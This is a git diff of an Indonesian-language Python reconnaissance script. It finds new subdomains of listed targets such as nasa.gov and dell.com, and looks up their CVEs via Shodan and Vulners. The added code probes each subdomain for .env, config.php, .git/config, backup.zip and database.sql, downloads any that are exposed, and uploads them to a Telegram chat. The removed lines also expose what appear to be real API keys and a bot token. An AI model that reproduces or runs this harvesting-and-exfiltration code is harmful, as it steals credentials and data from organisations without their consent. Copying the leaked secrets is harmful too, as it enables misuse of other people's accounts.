@@ -6,28 +6,37 @@ from datetime import datetime
 from bs4 import BeautifulSoup
 
 # ============== KONFIGURASI ==============
-TELEGRAM_BOT_TOKEN = "7561676850:AAFaIR88IcLFX7in_6QVhAGSP_QoLYQ0ZOI"
-TELEGRAM_CHAT_ID = "6690951901"
-MAX_AGE_DAYS = 180
-DOMAIN_LIST = ["nasa.gov", "dell.com", "intel.com", "oppo.com"]  # Tambahkan domain lain di sini
-CHECKED_FILE = "checked.json"
-SLEEP_INTERVAL = 3600  # Waktu jeda antar siklus penuh (dalam detik)
+TELEGRAM_BOT_TOKEN = "TOKEN"
+TELEGRAM_CHAT_ID = "CHAT_ID"
+SHODAN_API_KEY = "SHODAN_API"
+VULNERS_API_KEY = "VULNERS_API"
 
-SHODAN_API_KEY = "BOdGuR5XJu4ny9SM3qkltjPukUvP3ILY"
-VULNERS_API_KEY = "UJ726PQ7LXLRDKCZ0NVKDPYJ5SGAWBRZ1MRSXO9FI6E4HL4CTEZPDN1WI7KS8BE5"
+DOMAIN_LIST = ["a.com", "b.com"]
+MAX_AGE_DAYS = 180
+CHECKED_FILE = "checked.json"
+SLEEP_INTERVAL = 3600
+DOWNLOAD_FOLDER = "downloaded"
 # =========================================
 
 def send_telegram(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    data = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": message,
-        "parse_mode": "Markdown"
-    }
+    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
     try:
         requests.post(url, data=data, timeout=10)
     except Exception as e:
-        print(f"[ERROR] Gagal kirim notifikasi: {e}")
+        print(f"[ERROR] Telegram text: {e}")
+
+def send_telegram_file(filepath, caption=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+    try:
+        with open(filepath, 'rb') as file:
+            files = {'document': file}
+            data = {'chat_id': TELEGRAM_CHAT_ID}
+            if caption:
+                data['caption'] = caption
+            requests.post(url, files=files, data=data, timeout=20)
+    except Exception as e:
+        print(f"[ERROR] Telegram file: {e}")
 
 def load_checked():
     if not os.path.exists(CHECKED_FILE):
@@ -99,10 +108,7 @@ def get_cve_shodan(ip):
 def get_cve_vulners(domain):
     try:
         url = "https://vulners.com/api/v3/search/lucene/"
-        params = {
-            "query": domain,
-            "apiKey": VULNERS_API_KEY
-        }
+        params = {"query": domain, "apiKey": VULNERS_API_KEY}
         resp = requests.post(url, json=params, timeout=10)
         if resp.status_code == 200:
             data = resp.json()
@@ -123,9 +129,36 @@ def format_cve_list(shodan_cves, vulners_cves):
         result += f"- `{cve}` ({', '.join(set(sources))})\n"
     return result.strip()
 
+def scan_sensitive_files(subdomain):
+    paths = [".env", "config.php", ".git/config", "backup.zip", "database.sql"]
+    findings = []
+    os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)
+
+    for path in paths:
+        url = f"http://{subdomain}/{path}"
+        try:
+            resp = requests.get(url, timeout=6, allow_redirects=True)
+            content_type = resp.headers.get("Content-Type", "").lower()
+
+            if resp.status_code == 200 and "html" not in content_type:
+                if "json" in content_type:
+                    findings.append(f"- `{path}` → 200 OK (JSON): {url}")
+                elif "xml" in content_type:
+                    findings.append(f"- `{path}` → 200 OK (XML): {url}")
+                else:
+                    filename = f"{subdomain.replace('.', '_')}_{path.replace('/', '_')}"
+                    fullpath = os.path.join(DOWNLOAD_FOLDER, filename)
+                    with open(fullpath, "wb") as f:
+                        f.write(resp.content)
+                    send_telegram_file(fullpath, caption=f"{subdomain} → {path}")
+                    os.remove(fullpath)
+                    findings.append(f"- `{path}` → 200 OK (file dikirim)")
+        except:
+            continue
+    return findings
+
 def run():
     checked = load_checked()
-
     while True:
         for domain in DOMAIN_LIST:
             if domain not in checked:
@@ -142,20 +175,19 @@ def run():
                 if recent:
                     status, title = check_http(sub)
                     ip = resolve_ip(sub)
-
-                    if ip:
-                        shodan_cves = get_cve_shodan(ip)
-                    else:
-                        shodan_cves = []
-
+                    shodan_cves = get_cve_shodan(ip) if ip else []
                     vulners_cves = get_cve_vulners(sub)
                     cve_result = format_cve_list(shodan_cves, vulners_cves)
+
+                    files_found = scan_sensitive_files(sub)
+                    file_section = "\n📂 *File Sensitif:*\n" + "\n".join(files_found) if files_found else ""
 
                     message = (
                         f"🔔 *{domain} - Subdomain baru terdeteksi!*\n"
                         f"`{sub}`\n📅 Aktif: {tgl}\n"
                         f"📄 Status: `{status}`\n📝 Title: *{title}*\n"
                         f"\n*CVEs:*\n{cve_result if cve_result else 'Tidak ditemukan'}"
+                        f"{file_section}"
                     )
                     print(message)
                     send_telegram(message)
@@ -163,11 +195,10 @@ def run():
                 checked[domain].append(sub)
 
             save_checked(checked)
+            print(f"[INFO] Domain {domain} selesai. Tunggu 1 menit...\n")
+            time.sleep(60)
 
-            print(f"[INFO] Selesai cek domain {domain}. Menunggu 1 menit sebelum domain berikutnya...\n")
-            time.sleep(60)  # Delay antar domain
-
-        print(f"[INFO] Selesai cek semua domain. Tidur {SLEEP_INTERVAL // 60} menit...\n")
+        print(f"[INFO] Selesai semua domain. Tidur {SLEEP_INTERVAL // 60} menit...\n")
         time.sleep(SLEEP_INTERVAL)
 
 if __name__ == "__main__":
